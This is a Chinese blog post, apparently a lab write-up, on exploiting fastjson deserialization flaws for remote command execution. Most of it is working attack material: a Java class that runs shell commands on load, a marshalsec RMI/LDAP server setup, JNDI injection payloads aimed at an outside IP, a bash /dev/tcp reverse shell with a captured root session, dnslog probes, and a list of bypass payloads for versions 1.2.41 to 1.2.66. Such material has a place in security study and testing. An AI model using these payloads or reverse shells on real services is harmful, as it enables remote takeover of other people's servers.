---
title:      "「fastjson」:浅谈json的反序列化"
author:     "Bin4xin"
catalog: true
article_header:
  type: cover
tags:
    - 笔记
    - vulnhub
    - 漏洞复现
    - CVE

---



# fastjson指纹特征
访问页面，查看反包是一个指定的json格式的数据。请求包：
```javascript
GET / HTTP/1.1
Host: underattack-host:8090
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```
反包：
```javascript
HTTP/1.1 200 
Content-Type: application/json;charset=UTF-8
Content-Length: 28
Date: Tue, 19 May 2020 01:05:29 GMT
Connection: close

{
    "age":25,
    "name":"Bob"
}
```
如上的请求和反包。我们知道了json的格式直接构造参数，给服务器发包看看：
```javascript
POST / HTTP/1.1
Host: underattack-host:8090
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Length: 26

{"name":"hello", "age":20}
```
反包：
```javascript
HTTP/1.1 200 
Content-Type: application/json;charset=UTF-8
Content-Length: 30
Date: Tue, 19 May 2020 01:06:20 GMT
Connection: close

{
    "age":20,
    "name":"hello"
}
```
我们看到服务器端返回包为我们构造的包。


### fastjson 1.2.24 反序列化导致任意命令执行漏洞
fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。

参考资料：
- https://www.freebuf.com/vuls/208339.html
- http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/

首先编译并上传命令执行代码
```javascript
# cat dnslog.java

import java.lang.Runtime;
import java.lang.Process;

public class dnslog {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"/bin/sh", "-c", "ping user.`whoami`.c08aqu.dnslog.cn"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```
编译：`javac dnslog.java`。生成class文件；然后我们借助[marshalsec](https://github.com/mbechler/marshalsec)项目，启动一个RMI服务器，监听9999端口，并指定受害机器访问9999端口后，去加载远程服务器的类`dnslog.class`，而class文件就是执行command。
```bash
git clone https://github.com/mbechler/marshalsec.git

cd marshalsec

mvn clean package -DskipTests #看到BUILD SUCCESS后进入target

cd target

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "https://www.chihou.pro/#dnslog" 9999

* Opening JRMP listener on 9999
```


开启监听。向靶场服务器发送Payload，带上RMI的地址：
```javascript
POST数据：
{
    "b":{

        "@type":"com.sun.rowset.JdbcRowSetImpl",

        "dataSourceName":"rmi://47.52.233.92:9999/dnslog",

        "autoCommit":true
    }
}
----
{
    "name":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },

    "x":{

        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://47.52.233.92:9999/expUseful",
        "autoCommit":true
    }
}
```
发送完毕后检查RMI服务器的监听记录：
```bash
* Opening JRMP listener on 9999
Have connection from /61.133.171.114:11430
Reading message...
Is RMI.lookup call for dnslog 2
Sending remote classloading stub targeting https://www.chihou.pro/dnslog.class
Closing connection
```
受害机器已经访问了我们的服务器，最后检查是否执行dnslog命令；

```bash
user.root.c08aqu.dnslog.cn  61.132.161.12   2020-08-14 15:43:30
user.root.c08aqu.dnslog.cn  61.132.161.5    2020-08-14 15:43:30
user.root.c08aqu.dnslog.cn  61.132.161.12   2020-08-14 15:43:30
user.root.c08aqu.dnslog.cn  61.132.161.5    2020-08-14 15:43:30
```
可见，`ping`命令已成功执行;

#### 反弹shell
同样的，直接在poc代码里修改反弹shell的代码即可。
```bash
import java.lang.Runtime;
import java.lang.Process;

public class nc {
    static {
    
        try{
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/47.52.233.92/12341 0>& 1"};
        Process pc = rt.exec(commands);
        pc.waitFor();
        }catch (Exception e) {
        //no
        }
    
    }
}
```
同理即可获得反弹shell：
```bash
# nc -lvnp 12341
Listening on 0.0.0.0 12341
Connection received on 120.242.209.70 3450
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@5a8812147218:/# whoami
whoami
root
```

## dnslog

```bash
{"rand1":{"@type":"java.net.InetAddress","val":"http://dnslog"}}

{"rand2":{"@type":"java.net.Inet4Address","val":"http://dnslog"}}

{"rand3":{"@type":"java.net.Inet6Address","val":"http://dnslog"}}

{"rand4":{"@type":"java.net.InetSocketAddress"{"address":,"val":"http://dnslog"}}}

{"rand5":{"@type":"java.net.URL","val":"http://dnslog"}}

一些畸形payload，不过依然可以触发dnslog：
{"rand6":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}
{"@type": "java.lang.AutoCloseable"


{"rand7":Set\[{"@type":"java.net.URL","val":"http://dnslog"}\]}

{"rand8":Set\[{"@type":"java.net.URL","val":"http://dnslog"}

{"rand9":{"@type":"java.net.URL","val":"http://dnslog"}


{"@type": "java.lang.AutoCloseable"
```


---

```bash


{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://47.52.233.92:9999/expUseful","autoCommit":true}}

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://47.52.233.92:9999/expUseful","autoCommit":true}
```

---

* 1.2.41

```bash
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://47.52.233.92:9999/expUseful", "autoCommit":true}
// 直接加 [ 是不可以的，因为数组实例化的是Object类型，所以需要将传入的变量设置为数组格式，然后在com.alibaba.fastjson.serializer.ObjectArrayCodec中通过数组对象的getComponentType()可以获得数组元素，即com.sun.rowset.JdbcRowSetImpl对象
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://47.52.233.92:9999/expUseful","autoCommit":true]}
```

* 1.2.42

```bash
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://47.52.233.92:9999/expUseful", "autoCommit":true}
//原来在41版本的[还能用
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://47.52.233.92:9999/expUseful","autoCommit":true]}
```

* 1.2.43

```bash
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://47.52.233.92:9999/expUseful"}}
```
* 1.2.45

```bash
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://47.52.233.92:9999/expUseful"}}
```
* 1.2.47

```bash
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://47.52.233.92:9999/expUseful","autoCommit":true}}}

{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://47.52.233.92:9999/expUseful","autoCommit":true}}}

```
* 1.2.60

```bash
{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://47.52.233.92:9999/expUseful"}
```

```bash
{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"ldap://47.52.233.92:9999/expUseful"}
```


{\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"rmi://10.10.20.166:1099/ExportObject\"}
{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"ldap://10.10.20.166:1389/ExportObject\"}


{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"}"

* 1.2.62

```bash
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1099/exploit"}
```

* 1.2.66

```bash
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://47.52.233.92:9999/expUseful"}
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://47.52.233.92:9999/expUseful"}
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://47.52.233.92:9999/expUseful"}
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"
java.util.Properties","UserTransaction":"ldap://47.52.233.92:9999/expUseful"}}
```



* RMI

```bash

{"@type":"LLcom.sun.rowset.RowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true} 1.2.42
{"@type":"[com.sun.rowset.RowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true} 1.2.25v1.2.43
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties"："data_source":"rmi://localhost:1099/Exploit"}} 1.2.25
{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"}1.2.60
{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"} 1.2.60
{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"} 1.2.61
{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"rmi://localhost:1099/Exploit\"}  1.2.62
{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"rmi://localhost:1099/Exploit\"} AnterosDBCPConfig
{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"rmi://localhost:1099/Exploit\"} AnterosDBCPConfig
{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\":{\"UserTransaction\":\"rmi://localhost:1099/Exploit\"}} JtaTransactionConfig
```

